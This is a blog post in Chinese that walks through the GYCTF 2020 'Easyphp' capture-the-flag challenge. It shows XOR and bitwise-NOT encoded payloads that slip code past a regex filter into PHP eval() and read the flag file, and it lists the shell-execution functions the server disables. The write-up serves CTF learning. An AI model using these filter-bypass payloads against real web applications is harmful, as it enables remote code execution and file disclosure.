@@ -1,0 +1,173 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="suyumen"><meta name="renderer" content="webkit"><meta name="copyright" content="suyumen"><meta name="keywords" content="SUYUMEN"><meta name="description" content=""><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>GYCTF-2020-Easyphp · SUYUMEN</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/avatar.jpg"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">suyumen</div><div class="profile-signature">目前主要在学习web相关</div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/back.jpg);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">SUYUMEN</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">GYCTF-2020-Easyphp</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2021-05-01</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="异或绕过"> 异或绕过</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><hr>
+<p>直接给了源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="variable">$_</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;rosé will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower(<span class="variable">$_</span>), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发现诸多不会的东西，开始上网查。</p>
+<p>1.</p>
+<p>首先就是这个<code>@$_GET</code>没见过：<code>@</code>用于防止出现任何警告或错误信息，好像没什么影响。</p>
+<p>2.</p>
+<p>正则匹配我才发现这个网址<a target="_blank" rel="noopener" href="https://regex101.com/">https://regex101.com/</a>太好用勒！<br>第一个<code>if</code>过滤了不少呦。特别是过滤了<code>.</code>，不能字符串拼接了，但是发现没有过滤<code>^</code>和<code>~</code>符号，想到取反和异或（但是我还不会），先查查没过滤的函数。</p>
+<p>但是怎么查呢，作为一名面向<code>wp</code>学习的<code>web</code>手，要积极地看别人的<code>wp</code>，原来可以调用<code>get_defined_functions()</code>这个函数，获取所有的内置定义函数，再把正则匹配写上过滤，运行程序出结果。<br>得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">bcmul//两个任意精度数字相乘，返回结果</span><br><span class="line">rtrim//移除字符串右侧的空白字符或其他预定义字符</span><br><span class="line">trim//移除字符串两侧的空白字符或其他预定义字符</span><br><span class="line">ltrim//移除字符串左侧的空白字符或其他预定义字符</span><br><span class="line">chr//返回指定的字符</span><br><span class="line">link//建立一个硬连接（不懂）</span><br><span class="line">unlink//删除文件</span><br><span class="line">tan//正切</span><br><span class="line">atan//反正切</span><br><span class="line">atanh//反双曲正切</span><br><span class="line">tanh//双曲正切</span><br><span class="line">intval//获取变量整数值</span><br><span class="line">mail//发送邮件</span><br><span class="line">min//返回最小值</span><br><span class="line">max//返回最大值</span><br></pre></td></tr></table></figure>
+
+<p>一看没什么眼熟的函数就没戏。</p>
+<p>3.</p>
+<p><code>strtolower()</code>函数：把所有字符转换为小写；<br><code>count_chars()</code> 函数：返回字符串中所用字符的信息（例如，ASCII 字符在字符串中出现的次数，或者某个字符是否已经在字符串中使用过）。</p>
+<p><code>count_chars(string,mode)</code><br><code>string</code>:    必需。规定要检查的字符串。<br><code>mode</code>:可选。规定返回模式。默认是 0。</p>
+<pre><code>0 - 数组，ASCII 值为键名，出现的次数为键值
+1 - 数组，ASCII 值为键名，出现的次数为键值，只列出出现次数大于 0 的值
+2 - 数组，ASCII 值为键名，出现的次数为键值，只列出出现次数等于 0 的值
+3 - 字符串，带有所有使用过的不同的字符
+4 - 字符串，带有所有未使用过的不同的字符
+</code></pre>
+<p>所以现在我能看懂了，第二个<code>if</code>要求<code>$_</code>中用到的字符的小写数量小于等于<code>13</code>个。</p>
+<h2 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a><strong>异或绕过</strong></h2><p>4.</p>
+<p>下面就着手异或，很好我果然不会，继续研究别人的wp,好了我会了：</p>
+<p>先查看phpinfo()</p>
+<p><code>?_=phpinfo();</code></p>
+<p><code>?_=(~%8f%97%8f%96%91%99%90)();</code></p>
+<p>然后查看禁用的函数：</p>
+<p><code>disable_functions</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm//为进程设置一个alarm闹钟信号</span><br><span class="line">pcntl_fork//在当前进程当前位置产生分支（子进程）</span><br><span class="line">pcntl_waitpid//等待或返回fork的子进程状态</span><br><span class="line">pcntl_wait//等待或返回fork的子进程状态</span><br><span class="line">pcntl_wifexited//检查状态代码是否代表一个正常的退出</span><br><span class="line">pcntl_wifstopped//检查子进程当前是否已经停止</span><br><span class="line">pcntl_wifsignaled//检查子进程状态码是否代表由于某个信号而中断</span><br><span class="line">pcntl_wifcontinued//没找到，估计是继续运行子程序</span><br><span class="line">pcntl_wexitstatus//返回一个中断的子进程的返回代码</span><br><span class="line">pcntl_wtermsig//返回导致子进程中断的信号</span><br><span class="line">pcntl_wstopsig//返回导致子进程停止的信号</span><br><span class="line">pcntl_signal//安装一个信号处理器</span><br><span class="line">pcntl_signal_get_handler//获取指定信号的当前处理程序</span><br><span class="line">pcntl_signal_dispatch//调用等待信号的处理器</span><br><span class="line">pcntl_get_last_error//检索最后一个失败的pcntl函数设置的错误号</span><br><span class="line">pcntl_strerror//检索与给定error关联的系统错误消息</span><br><span class="line">pcntl_sigprocmask//设置或检索阻塞信号</span><br><span class="line">pcntl_sigwaitinfo,</span><br><span class="line">pcntl_sigtimedwait,</span><br><span class="line">pcntl_exec,</span><br><span class="line">pcntl_getpriority,</span><br><span class="line">pcntl_setpriority,</span><br><span class="line">pcntl_async_signals,</span><br><span class="line">system//执行外部程序，并且显示输出</span><br><span class="line">exec//执行一个外部程序</span><br><span class="line">escapeshellarg//把字符串转码为可以在 shell 命令里使用的参数</span><br><span class="line">escapeshellcmd//shell 元字符转义</span><br><span class="line">passthru//执行外部程序并且显示原始输出</span><br><span class="line">proc_close//关闭由 proc_open() 打开的进程并且返回进程退出码</span><br><span class="line">proc_get_status//获取由 proc_open() 函数打开的进程的信息</span><br><span class="line">proc_open//执行一个命令，并且打开用来输入/输出的文件指针</span><br><span class="line">shell_exec//通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回</span><br><span class="line">mail//发送邮件</span><br><span class="line">imap_open//打开到邮箱的IMAP流</span><br></pre></td></tr></table></figure>
+
+<p>可以选用<code>scandir()</code>函数列目录，用<code>print_r()</code>函数输出<code>flag</code>文件。</p>
+<p><code>print_r(scandir(&#39;.&#39;));</code><br><code>?_=(~%8f%8d%96%91%8b%a0%8d%d7%8c%9c%9e%91%9b%96%8d%d7%d8%d1%d8));</code></p>
+<p>返回<code>you are so close, omg</code></p>
+<p>下一步就是保证字符种类的个数小于等于<code>13</code>，可以采取多次异或的方式。</p>
+<p>把<code>s,p,n</code>换掉，相当于使用<code>().;_cinrst^</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = d ^ c ^ t</span><br><span class="line">p = c ^ a ^ r</span><br><span class="line">n = c ^ d ^ i</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s-&gt;9b 9c 8b </span><br><span class="line">p-&gt;9c 9e 8d </span><br><span class="line">n-&gt;9c 9b 96</span><br></pre></td></tr></table></figure>
+
+<p><code>print_r</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%9c%8d%96%9c%8b%a0%8d)^(%9e%ff%ff%9b%ff%ff%ff)^(%8d%ff%ff%96%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff))</span><br></pre></td></tr></table></figure>
+
+<p><code>scandir</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%9b%9c%9e%9c%9b%96%8d^(%ff%ff%ff%ff%ff%ff%ff)^(%9c%ff%ff%9b%ff%ff%ff)^(%8b%ff%ff%96%ff%ff%ff))</span><br></pre></td></tr></table></figure>
+
+<p>总合一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_=((%9c%8d%96%9c%8b%a0%8d)^(%9e%ff%ff%9b%ff%ff%ff)^(%8d%ff%ff%96%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9c%9e%9c%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%9c%ff%ff%9b%ff%ff%ff)^(%8b%ff%ff%96%ff%ff%ff))((%d1)^(%ff)));</span><br></pre></td></tr></table></figure>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; .</span><br><span class="line">    [1] =&gt; ..</span><br><span class="line">    [2] =&gt; index.php</span><br><span class="line">    [3] =&gt; n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>最后利用<code>end()</code>读文件名，<code>show_source</code>读文件信息。</p>
+<p>有字符<code>show_urce(ndai.);</code>17个，利用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">w = a ^ c ^ u</span><br><span class="line">r = o ^ h ^ u</span><br><span class="line">i = d ^ c ^ n</span><br><span class="line">d = h ^ c ^ o</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">w-&gt;9c,9e,8a</span><br><span class="line">r-&gt;97,90,8a</span><br><span class="line">i-&gt;9c,9b,91</span><br><span class="line">d-&gt;97,90,9c,</span><br></pre></td></tr></table></figure>
+
+<p><code>show_source</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8c%97%90%9c%a0%8c%90%8a%97%9c%9a)^(%ff%ff%ff%9e%ff%ff%ff%ff%90%ff%ff)^(%ff%ff%ff%8a%ff%ff%ff%ff%8a%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))</span><br></pre></td></tr></table></figure>
+<p><code>end</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%9a%91%97)^(%ff%ff%90)^(%ff%ff%9c)^(%ff%ff%ff))</span><br></pre></td></tr></table></figure>
+<p><code>scandir</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8c%9c%9e%91%97%9c%97)^(%ff%ff%ff%ff%90%9b%90)^(%ff%ff%ff%ff%9c%91%8a)^(%ff%ff%ff%ff%ff%ff%ff))</span><br></pre></td></tr></table></figure>
+
+
+<p><code>payload</code>:<br><code>?_=show_source(end(scandir(.)));</code><br>拼一拼得到flag。</p>
+<hr>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://www.php.net/">https://www.php.net/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_string_strtolower.asp">https://www.w3school.com.cn/php/func_string_strtolower.asp</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freesion.com/article/8494620874/">https://www.freesion.com/article/8494620874/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5677">https://xz.aliyun.com/t/5677</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Zero_Adam/article/details/115468669">https://blog.csdn.net/Zero_Adam/article/details/115468669</a></p>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="https://suyumen.github.io">suyumen</a></p><p> <span>Link:  </span><a href="https://suyumen.github.io/2021/05/01/2021-05-01-[GYCTF2020]Easyphp/">https://suyumen.github.io/2021/05/01/2021-05-01-[GYCTF2020]Easyphp/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2021/05/08/2021-05-08-%5BGYCTF2020%5DEzsqli/" title="GYCTF-2020-Ezsqli"><span>< PreviousPost</span><br><span class="prevTitle">GYCTF-2020-Ezsqli</span></a><a class="nextSlogan" href="/2021/04/20/2021-04-20-java%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" title="java任意文件下载"><span>NextPost ></span><br><span class="nextTitle">java任意文件下载</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">异或绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.1.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
